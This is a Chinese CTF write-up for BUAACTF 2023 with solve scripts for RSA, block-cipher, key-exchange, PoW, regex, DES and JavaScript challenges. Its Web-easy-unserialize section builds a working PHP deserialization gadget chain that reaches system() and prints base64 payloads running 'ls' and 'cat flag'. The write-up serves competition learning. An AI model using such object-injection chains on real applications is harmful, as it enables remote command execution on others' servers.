# BUAACTF 2023

> Rank: 总榜13/45, 分榜7/22

大概又是讲到杂凑函数了吧（过不去的梗了），今年就只花了两天的时间，远没有上一次那么投入了。

## Crypto-asr

经典RSA求解

1. 给出模数 $n$ 解密密钥 $d$ 和 密文 $c$ ，那么明文直接一步到位 $m\equiv c^d\bmod{n}$
2. 观察到加密密钥 $e=3$ ，所以这里可以使用爆破的思想，因为 $m^3\equiv c\bmod{n}$ ，那么 $m^3=kn+c$ ，爆破 $k$ 使得 $m^3$ 能开出整数的三次方根即可。
3. 观察到 $n=p^2q$ ，所以 $\varphi(n)=p(p-1)(q-1)$ ，所以 $p=gcd(n, \varphi(n))$ 。又因为 $ed\equiv 1\bmod{\varphi(n)}$ ，所以 $e^ehint\equiv(ed)^e\equiv(k\varphi(n)+1)^e\equiv K\varphi(n)+1\bmod{n}$ ，所以 $p=gcd(e^ehint-1, n)$
4. 观察到只给了 $c$ 和 $d$ ，因为 $cd=k(p-1)(q-1)+1$ ，所以分解 $cd-1$ 的因子，然后枚举 $k, p-1, q-1$ ，分解后判断 $p, q$ 素性，以及解密是否完整。

以下是代码：

```python
from typing import Dict, Optional
from Crypto.Util.number import *
from gmpy2 import *

def flag1():
    n = 13302964813216810941959666853255210222342583731188082654677741702223980173634749035809268518166097414434192674822811161141232218989083448209641034748898355565960444187407647440933753873730008876632728962548755659432142376338455108281224538491079440785562167134963433706421826981438843271822167502821919515149444873613819013331369065110101337902941674825712675331337192584554239676773259170817522171700027400374630546727379609299264299681651475097765699741114447792901436790229998294306916894452371375071533631328031610536615598947958107097016439368371325981828840867911530866451562126546387416586140060791073626618171
    d = 2949490604369332042543655342791890164406280368915772743180112248983081543377297997433483058840920536394600518903553366029576652759633125798786865976119260487351740713348199738642632291020152993019393231772448026157375511740766259794810214895233668481756469464194390124604593799200285564098993951714309460899545523300043946837236273797195498365387755774114034941257616292307877720774171156114381075577723338923498056595485936673078054579587831306191650680276261413737997870014491621145234557744694509979003815832819781382700602076056363346055838285508968491064489347313652638793895792823952193689434574654936220766297
    c = 7341514904325243305916366755307613619986720174511882742618551303299211072238639697355688848838982859381059673626965867644794262469199311451859830077675478638021664398672855820772016553080248041423126832931514496938745208445375736707260454313824171424826722901995363477583995161036193016481186294852709458404458333446221603984645259151587573114428427735277027309336406258617224201950976459091693631413605064109193995691234530306891893956176304835942233668136457174326113366635285808539981707926919705083327383166833588162140190182526036544634656531901891826093020929484545070080101135823892331472086063699539818563591
    m = pow(c, d, n)
    return long_to_bytes(m).decode()


def flag2():
    c = 574808471478635333245317783955856232370563895750738178995495491244722220578259862014622258456002771074212202993749856311345778504
    n = 132275218780270789276875142391448867650895270629670759900527027384204094378702805212980599389161642078516147410438758869570165283020546983219261613517162232406493853982513805637479563931664593533545755290425758761320070903155316315225168568823850902007487296420757650976479888059670760410374801967212927224977
    k = 0
    while True:
        m3 = c + k*n
        m, flag = iroot(m3, 3)
        if flag:
            return long_to_bytes(m).decode()
        k += 1

def flag3():
    c = 95995020771266284668771773954095383926073034180948646028969032401939359632605448469918019304830962431504319950829514957438851980885420908331400633412921367641226567936331249173469086850004952349859327253487176970823999803143210342915194996505332578787985234930535548547834345641331406894553696409553432127676252530117997529863647389804169829603847371009965333521992075291993986519143392110820521102789536579717013822114100961105599532067858175576407477678474343
    hint = 331827959959669362980903675700579680333727515633777861628619061160155873334438387426601431102578757478220073973755314614841843834177072237961383958721650387302854513037804229759753543773380647137880844819226502619093178213699654143169541320688758073525229779021778299681565211604935016493932946601713080358152349008389888320122977378245126603180345245359431242722391116674672049868497727142316387043599105147729557199319037013456439001531544933422509782305382177
    n = 617084232354634109322171875468612900428229667931513848806770839434059627069484990725607996303673918867720768751727135179953407336155782580734284839136278190669702346600358059275099682118093888920038165877388324627028766987891732872124755908892972046287450095353992961045719531391795505441739616388353911919212662674941754442327213528963862921107314349391130370460483255191809581325731848910365215670220922837774417042794328874852028405333599359662323013152032901
    e = 0x10001
    k_phi_N = (pow(e, e, n)*hint)%n
    p = GCD(k_phi_N-1, n)
    q = n // (p*p)
    assert p*p*q == n
    d = inverse(e, p*(p-1)*(q-1))
    m = pow(c, d, n)
    return long_to_bytes(m).decode()

def __divide(factor: Dict[int, int]):
    __n = len(factor.items())
    max_counts = list(factor.values())
    num_counts = [0]*__n
    while True:
        former = {k: v for k, v in zip(factor.keys(), num_counts)}
        latter = {k: max_counts[i]-v for k, (i, v) in zip(factor.keys(), enumerate(num_counts))}
        yield former, latter

        should_break = False
        num_counts[0] += 1
        for i, num_count in enumerate(num_counts):
            if num_count > max_counts[i]:
                if i == __n - 1:
                    should_break = True
                    break
                num_counts[i] = 0
                num_counts[i+1] += 1
            else:
                break
        if should_break:
            break

def __rebuild(factor: Dict[int, int]) -> int:
    num = 1
    for k, v in factor.items():
        num *= (k**v)
    return num

def flag4() -> Optional[str]:
    c = 742481710491632202304950326079681148354035306250917295914498846416723687179474088162312486652622
    d = 242618035035163469434322293327938405750017912799190107714591368086742881522661519860077104080961

    # factor(c*d - 1)
    factor = dict([
        (2, 6),
        (3, 1),
        (7, 1),
        (463, 1),
        (907, 1),
        (19433, 1),
        (943543, 1),
        (1008719, 1),
        (5963791, 1),
        (3543613861, 1),
        (12584817233733301151531882291, 1),
        (5727098109225289640469565408489, 1)]
    )
    for i, j in __divide(factor):
        k = __rebuild(i)
        for fp, fq in __divide(j):
            p = __rebuild(fp) + 1
            if p == 2 or not is_prime(p):
                continue
            q = __rebuild(fq) + 1
            if q == 2 or not is_prime(q):
                continue
            n = p*q
            m = pow(c, d, n)
            try:
                str_m = long_to_bytes(m).decode()
                return str_m
            except:
                pass
    return None

print(flag1()+flag2()+flag3()+flag4())
```

## Crypto-Block

观察加密流程，先分组然后填充，分组长度为8。然后使用类似于CBC模式的加密模式，进行按位异或。了解到流程后，直接写出你过程：

```python
from functools import reduce
import operator
from typing import List

def unpad(s: str):
    pad_len: int = s[-1]
    if pad_len > 0 and pad_len < 8:
        return s[:8-pad_len]
    else:
        return s

def xor(a, b):
    assert len(a) == len(b)
    return bytes(map(operator.xor, a, b))

def decrypt(c: List[str], iv: str, key: str):
    parts = list(map(unpad, [reduce(xor, [result, iv if i == 0 else c[i-1], key]) for i, result in enumerate(c)]))
    parts = [part.decode() for part in parts]
    return "".join(parts)

iv = b'\xba=y\xa3\xc6)\xcf\xf7'
key = b'}6E\xeb(\x91\x08\xa0'
parts = [b'\x85^}\t\xad\xec\x81,', b'\xba\x04W\xa1\xee"\xea\xc5', b'\xb7ZW\x18\x99\x82\xd6:', b'\x99\x03}\x9c\xde|\xb1\xc5', b'\xa1Tk.\x8b\xee\xbaf']
print(decrypt(parts, iv, key))
```

## Crypto-KeyExchange

先写几个式子找规律：

$$
\begin{align*}
S_0&=ab&&=ab \\
S_1&=a^2b+b&&=(a^2+1)b \\
S_2&=a(a^2+1)b+b&&=(a^3+a+1)b \\
\vdots \\
S_n&=aS_{n-1}+b&&=(a^{n+1}+a^{n-1}+\dots+1)b
\end{align*}
$$

那么看看交换的逻辑，先是用私钥 $sk_a$ 和 $sk_b$ 生成两个公钥 $pk_a$ 和 $pk_b$ ，再用自己的私钥加密对方的公钥，得到对称加密的密钥，那么这里就等于是对原始信息加密了 $sk_a+sk_b$ 轮。即：

$$
\begin{align*}
key=S_{sk_a+sk_b}&=\sum_{i=0}^{sk_a+sk_b+1}a^ib-a^{sk_a+sk_b}b \\
&=(\sum_{i=sk_a}^{sk_a+sk_b+1}a^ib-a^{sk_a+sk_b}b)+(\sum_{i=0}^{sk_a-1}a^ib) \\
&=a^{sk_a}(\sum_{i=0}^{sk_b+1}a^ib-a^{sk_b}b)+(\sum_{i=0}^{sk_a-1}a^ib+a^{sk_a+1}b-a^{sk_a+1}b) \\
&=a^{sk_a}pk_b+pk_a-a^{sk_a}ab
\end{align*}
$$

所以当务之急是求出 $a^{sk_a}$ 。因为 $pk_a\equiv (a^{n+1}+\frac{a^n-1}{a-1})b\bmod{n}$ ，所以 $a^{sk_a}\equiv ((a-1)pk_ab^{-1}+1)(a^2-a+1)^{-1}\bmod{n}$

再根据 $hint=a^5-b^3$ 和 $s=ab$ 求解出 $a, b$ ，本题求解（居然是牛顿法求零点）。代码如下：

```python
"""
a**5 - b**3 = leak
a**8 - leak*a**3 - (a*b)**3 = 0

s = 103083435269546339253719292770367969157635923310796947624819807524514689714230038488629636887588073083408362510426148038690685619752778205013088349018307009939108678198113606930036410404549808586987764543060403391315169316818289657581541763263327670573813529568272160960214773113382466107788108424376942305179
leak = 29040777564893836055576935754958349303880224434489606637225123765874859084299305072404829973337935904266301029232783978449958360875461566254630838251549934932706914467564998782070045758886430608783726619661530870388938391442492043731894115397400015449950051951769344001061013880264004181568996494392695873947102851715933737547680797285706746028093745905399081868517548754953070086517995947839613006470389399208171194194504365074914947024889949570680226668773867669172700292722732348438746947857754535156207414199788546164281701388891687436649862876851080136461979528906440369488791240780833837652254029174364644864043838626162283607643013213942931346399529512644954169730170267869381208558883655869400666658812252861841021468606579935712846111089021383151894750921351386
x = var('x')
solve(x^8 - leak*x^3 - s**3, x)

a = 7809111936301730050325531123556941524419043237553061253494514954511014517669231983792610985652302681729865258538952534506348431869920157739027505606648803
b = 13200404362287192163148552119968004326885833343163012440942340955317646141728413841964693356971893069061461607441511516841951804153301936530283128891855593
"""

from Crypto.Util.number import *
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
from hashlib import sha256

def LCG(a, s, b, p):
    return (a * s + b) % p

def LCG_n(a, s, b, p, n):
    for _ in range(n):
        s = LCG(a, s, b, p)
    return s

def main():
    a = 7809111936301730050325531123556941524419043237553061253494514954511014517669231983792610985652302681729865258538952534506348431869920157739027505606648803
    b = 13200404362287192163148552119968004326885833343163012440942340955317646141728413841964693356971893069061461607441511516841951804153301936530283128891855593
    p = 110045941581246566163852236169863726493322518614291259738650243772537777220447239564993293840178002270803358414801874876416861655681706091960526864981702297311975108477231430850046449802619712390151394990272883738498246287828012579651055043742174921894177086628278972268977919519134723993840866617728971125501
    s = a*b

    pk_a = 104249886397359747249273092453488313866919664956033370839273165940023672119280749446507600277914299719461300855987124305389892009846065290488788845690592952592538823773157304003987554741970547804984472643400001801640946933980112156093413786073659705669257814748840719625590155866880068232234070029543099326008
    pk_b = 73943176009325878591909652784371325868093784459904155452171082544674415915957790552228923092972996591011414909913381038800791214834557764389213534028507829053436031472854955231610581309098048200856194242071844838535785588222371659431886892907007805510914868507217421041100993332508303713741693778352086616092

    _a_sk_a = ((pk_a*inverse(b, p)*(a - 1) + 1)*inverse(a**2 - a + 1, p)) % p
    _part_1 = (pk_a - _a_sk_a*a*b) % p
    _part_2 = (pk_b*_a_sk_a) % p
    key_a = (_part_1 + _part_2) % p

    key = sha256(str(key_a + s).encode()).digest()[:16]
    iv = bytes.fromhex("e759b23de290a6d4ea11dab4b0c306f3")
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    c = b'\xa8\x83\x8b,\x14\x1ad\xfb\xfd\x12\xc6\xc1=\xa0+k\x05\xc7\xc9\xed\xde\xca>\x04\xe1;\xcc\xc1\xb6\x9a+\xe66d\xcf\x9b\xfftp\x81\xab\xbf(\x02\xcd\x0b\xa4\xc0Lpg\x83F\x82l\xad2\xdcI\x1ab\x08\x88\n'
    m = unpad(cipher.decrypt(c), 16).decode()
    print(m)


main()
```

## Crypto-Math

RSA专场吗？

1. 因为 $leak\equiv n+p\equiv p(q+1)\equiv 2p\bmod{q-1}$ ，所以 $2n=2pq=kq(q-1)$ ，爆破 $k$ ，当该方程有整数解时，验证 $p, q$ 素性以及解的正确性。
2. 已知 $leak=p+q+d$ ，所以 $n-leak+1=\varphi(n)-d$, 所以 $c^{\varphi(n)-d}\equiv c^{-d}\bmod{n}$ ，所以 $m\equiv (c^{n-leak+1})^{-1}\bmod{n}$
3. 因为 $n=pq$ 所以 $p^q\equiv p\bmod{n}$ ，所以 $leak\equiv p^q+q^p\equiv p+q \bmod{n}$ ，所以 $\varphi(n)=n-leak+1$

```python
from Crypto.Util.number import *
from gmpy2 import *

def unpad():
    pass

def solve1():
    e = 65537
    c = 112603855258130214477579025724347852348654764350616283814228948696384649423509219700593580927436981131009253539258926656199553162798353424478456071312399854016855769730451167219095385224786982617931318336289395411790738746409786626741975659380781585117554886308860499453339049544449101737359477485341756095685
    n = 156554201159196482703626229456180336082601822691986590744780894650795965611900555514134060137082990473725887830010623065818450185823730822009287525836754951877076875771488298693374835052451569073414980813577454117535462658662205409616157954907990248587384015512293862003341283487632375295475440935688094002617
    leak = 3118625448174043604744529027319786605170955560813558072118277982181159822887603847530258597519488281509287189431662221215460717933909531417536796929018210
    # Eq: k*q**2 + (leak-k)*q - 2*n = 0

    k = 1
    while True:
        delta = (leak - k)**2 + 8*k*n
        r, flag = iroot(delta, 2)
        if flag:
            q = (r + k - leak) // (2*k)
            p = (k*(q-1) + leak) // 2
            assert p*q == n
            d = inverse(e, (p-1)*(q-1))
            m = pow(c, d, n)
            return long_to_bytes(m).split(b'\x00', 1)[0].decode()
        k += 1

def solve2():
    e = 65537
    c = 93978686378293828086191790122529919325716419332933686245770487684123528049983735994708527178252488091788860014057317894385773677231842636035334795883708882974841442069339023354766426009980023194357039539192634379156228433248998982297141837057318199779573613425738350307108121215320184191104501916977179892819
    n = 113314208967522806109377775391344774798246647245609527530250842162998260734597302913497036905918762468707747032503484781341144969937434755205814353751104297147933894782213419095409180897649121217538219106453769844032495640631837946695496195968385913896925163019434775707488581307013382934251169925612458912701
    leak = 92227188008859636551571172271384433717034261725865660741125015972908284264524691925307008950647919630793901680894279288364099880089609034246812387558747800115003457695305687069115350786189814893940014083795308121668729848809030525554558177868795576913946290045467615215700823448216007469394406486122762340799
    index = n - leak + 1
    m = inverse(pow(c, index, n), n)
    return long_to_bytes(m).split(b'\x00', 1)[0].decode()

def solve3():
    e = 65537
    c = 57267353578218922590866753594427040157686249506833227002343780474377875165575891892094097781872920937467859618146840876344931100376140310307914367629844308420600760564342032844568436492313668901310573464694813393787808054157639041836407430313117254669011492042858846089516806744148324079065759777653798065470
    n = 72559362705546768966148503007933634888094434921837745715507408562619698919824091078235194244259688366819227638823888641073251820477424150670604138979273724058577742415825092468613527614237094273848230891355347434776123637086037409586867384122532873818945115846995272181542565199089210266795364142054521432969
    leak = 17238032591075070541888189318082997841936669281409415876040204774279914799918723435203750385624612322410269658410156575528112867456120069790169980041169270
    phi_n = n - leak + 1
    d = inverse(e, phi_n)
    m = pow(c, d, n)
    return long_to_bytes(m).split(b'\x00', 1)[0].decode()

print(solve1()+solve2()+solve3())
```

## Misc-chatgpt

猫咪问答BUAA版，一开始是个PoW，写个脚本上去爆破，然后切换到交互模式。

答题的话，直接猜就完事。后面石头剪刀布的游戏，第一个尝试了一下负数，居然真的成功了，然后第二个在出题人的指点下，想到了复数。

以下是PoW的脚本（后面可以复用）：

```python
import hashlib

from pwn import *


def __combin(charset: str, length: int) -> str:
    mapper = {k: v for k, v in enumerate(charset)}
    charset_size = len(charset)
    indexs = [0] * length
    should_break = False
    while not should_break:
        yield "".join(map(lambda index: mapper[index], indexs))
        indexs[0] += 1
        for i in range(length):
            if indexs[i] >= charset_size:
                indexs[i] = 0
                if i == length - 1:
                    should_break = True
                    break
                else:
                    indexs[i+1] += 1
            else:
                break

def pow(base: str, target: str):
    charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    for head in __combin(charset, 4):
        hash_value = hashlib.sha256((head+base).encode()).hexdigest()
        if hash_value == target:
            return head


def main():
    srv = remote("10.212.26.206", 23693)
    line = srv.recvline().decode().strip().split()
    base = line[0].split('+')[1].strip(")")
    target = line[2]
    head = pow(base, target)
    srv.recv()
    srv.sendline(head.encode())
    print("done")
    srv.interactive()

main()
```

## Pwn-NLP

正则表达式——前ChatGPT时代的自然语言处理（我真的这么干过），干就完事了

```python
from pwn import *
import re


area_info = {
    "110000": "北京市",
    "110101": "东城区",
    "110102": "西城区",
    "110105": "朝阳区",
    "110106": "丰台区",
    "110107": "石景山区",
    "110108": "海淀区",
    "110109": "门头沟区",
    "110111": "房山区",
    "110112": "通州区",
    "110113": "顺义区",
    "110114": "昌平区",
    "110115": "大兴区",
    "110116": "怀柔区",
    "110117": "平谷区",
    "110118": "密云区",
    "110119": "延庆区",
    "110228": "密云区",
    "110229": "延庆区",
}

def step0(server: remote) -> int:
    line = server.recvline().decode().strip()
    if not line[:5] == "round":
        _ = server.recvlines(2)
        with open("sample.txt", 'w', encoding="utf-8") as f:
            f.write(server.recvline().decode().strip())
        return 1

    line = server.recvline().decode().strip()
    a = int(line.split(':')[1])
    line = server.recvline().decode().strip()
    b = int(line.split(':')[1])

    line = server.recv().decode().strip()
    op = line.split()[5]
    res = 0
    if op == '+':
        res = a + b
    elif op == '-':
        res = a - b
    elif op == '*':
        res = a * b
    elif op == '/':
        res = a // b
    server.sendline(str(res).encode())

    line = server.recvline().decode().strip()
    return 0

def step1(server: remote) -> int:
    line = server.recvline().decode().strip()
    if not line[:5] == "round":
        print(line)
        return 2

    server.recvline()
    line = server.recvline().decode().strip()
    parts = line.split("。")
    all_info = {}
    for part in parts:
        t = part.split("：")
        if len(t) > 1:
            info = t[-1].strip()
            if re.match("\\d{11}$", info):
                all_info["tel"] = info
            elif re.match("http.*", info):
                all_info["url"] = info
            elif re.match(".*?@.*", info):
                all_info["mail"] = info
            elif re.match("\\d+:\\d+-\\d+:\\d+", info):
                all_info["work_time"] = info
            elif re.match("\\d+k-\\d+k", info):
                all_info["payment"] = info
            elif re.match("\\d{4}年\\d+月\\d+日", info):
                all_info["date"] = info
            elif re.match("\\d+\\.\\d+\\.\\d+\\.\\d+", info):
                all_info["ip"] = info
            elif re.match("\\d{17}[0-9X]", info):
                all_info["id"] = info
                all_info["sex"] = "男" if int(info[-2]) % 2 == 1 else "女"
                all_info["birthday"] = "{}年{}月{}日".format(info[6:10], int(info[10:12]), int(info[12:14]))
                all_info["area"] = area_info[info[:6]]

    server.recv()

    if len(all_info.items()) == 11:
        info_str = "电话: {tel} | 邮箱: {mail} | URL: {url} | 日期: {date} | IP: {ip} | 身份证: {id} (地区: {area}, 生日: {birthday}, 性别: {sex}) | 薪资: {payment} | 工作时间: {work_time}".format(**all_info)
        server.sendline(info_str.encode())
    else:
        print("Error!!!!!")
        exit(1)
    line = server.recvline().decode().strip()
    return 1

def main():
    server = remote("10.212.26.206", 23004)
    step = 0
    while True:
        if step == 0:
            step = step0(server)
        elif step == 1:
            step = step1(server)
        else:
            server.close()
            break


main()
```

## Rev-snake

IDA启动！

![解密部分](https://i.328888.xyz/2023/04/30/iKhOoF.png)

点击跳转到密文

![密文](https://i.328888.xyz/2023/04/30/iKhHcZ.png)

直接解密

```python
from Crypto.Cipher import DES
from Crypto.Util.number import *

def main():
    key = bytes([0, 0, 0, 0])+long_to_bytes(0x12345678)
    cipher = DES.new(key, DES.MODE_ECB)
    cc = [0x75DBA1CAC6A1FBFB, 0x7C1361AEEEE6E996, 0x3EC239DA85BE7D63]
    mm = [cipher.decrypt(long_to_bytes(c)).decode() for c in cc]
    for m in mm:
        print(m[::-1], end="")
    print()

main()
```

## Rev-oneQuiz's revenge

用jadx逆向，打开`SecondActivity.java`，发现是一个迷宫，边走边记录，拿到flag。

## Web-easy-unserialize

看上去不是很复杂的反序列化的题目

浏览下来，主要的任务是调用`KeyPort`的`__call`函数，从而执行`system`命令，来获得shell。

`__call`函数是在实例调用不存在的函数时，调用的回调函数，参数是函数名称以及函数的参数组成的列表。这里我们可以看到，想要执行`system`函数，需要`KeyPort`实例中存在一个`format`字典，其中需要一个键（名称目前未知），但是值是`system`。

```php
$a = new KeyPort;
$a->format = array();
$a->format['???'] = "system";
```

下面就是考虑如何调用这个`__call`函数。没得选，只有`Sun`和`Moon`在`__destruct`中调用了别的函数，所以，只能选其中一个。因为函数名都是`forward`，所以，`system`的键命为`forward`

```php
$a = new KeyPort;
$a->format = array();
$a->format['forward'] = "system";
```

观察到，在`$this->process->finish()`过程中，会把`format`置空，那么`process`就是个空数组，如果使用`Sun`，这里虽然可以触发`__call`，但是没有数据进去了，所以只能使用`Moon`。所以这里需要一个`Moon`实例，其中`process`变量为`KeyPort`，`options`中存在一个键为`new`值为`KeyPort`的字典。

```php
$a = new Moon;
$a->process = new KeyPort;

$a->options = array();
$b = new KeyPort;
$b->format = array();
$b->format['forward'] = "system";
$a->options['new'] = $b;
```

因为在`process`中，要执行`finish`函数，并且返回值要求是`true`，唯一存在返回值的就是`ArrayObj`中的`__get`函数，这是用于获取实例中无法获取的值时，失败的回调函数。因为`iffinsh`是私有变量，无法直接获取，所以这里需要调用`__get`，那么`ArrayObj`中的`name`变量需要存在一个键为`iffinish`值为`true`的键值对。

最终代码如下：

```php
class KeyPort {
    public function __call($name, $arguments) {
        if(!isset($this->wakeup)||!$this->wakeup) {
            call_user_func_array($this->format[$name],$arguments);
        }
    }

    public function finish() {
        $this->format=array();
        return $this->finish->iffinish;
    }

    public function __wakeup() {
        //$this->wakeup=True;
    }
}

class ArrayObj{

    private $iffinish;
    public $name;

    public function __get($name) {
        return $this->$name=$this->name[$name];
    }
}

class Sun {
    public function __destruct() {
        if ($this->process->finish()) {
            $this->process->forward($this->_forward);
        }
    }
}

class Moon {
    public function __destruct() {
        if ($this->process->finish()) {
            $this->options['new']->forward($this->_forward);
        }
    }

    public function __wakeup(){

    }
}

if (isset($_GET['u']) && $_GET['u']) {
    unserialize(base64_decode($_GET['u']));
} else {
    highlight_file(__FILE__);
    error_reporting(0);

    $a = new ArrayObj;
    $a->name = array();
    $a->name['iffinish'] = true;
    $b = new KeyPort;
    $b->finish = $a;

    $c = new KeyPort;
    $c->format = array();
    $c->format['forward'] = "system";

    $d = new Moon;
    $d->process = $b;
    $d->options['new'] = $c;

    $d->_forward = "ls";
    print("\$ ls\n");
    print(base64_encode(serialize($d)));
    print("\n");

    $d->_forward = "cat flag";
    print("\$ cat flag\n");
    print(base64_encode(serialize($d)));
    print("\n");
}
```

将两串Base64发到服务器，获得flag

## Web-mota

最怕玩魔塔了，24层版本的魔塔到现在还没通关过，这个好像还就是24层版本的QAQ。

玩了一会儿，要不直接看看源码吧。浏览到`Events.js`时候，`Ctrl+F`寻找BUAA字样，然后看到了一个`useful`变量，然后一路下去，遇到的变换直接在浏览器控制台直接运行，获得三段flag。

```js
useful_1= "BUAACTF{HT";

text = "NV9tb3RhXzFz";
useful_2 = atob(text);

text = new Uint8Array([95, 115, 48, 95, 102, 117, 110, 33, 125]); 
useful_3 = String.fromCharCode.apply(null, text);

flag = useful_1 + useful_2 + useful_3;
```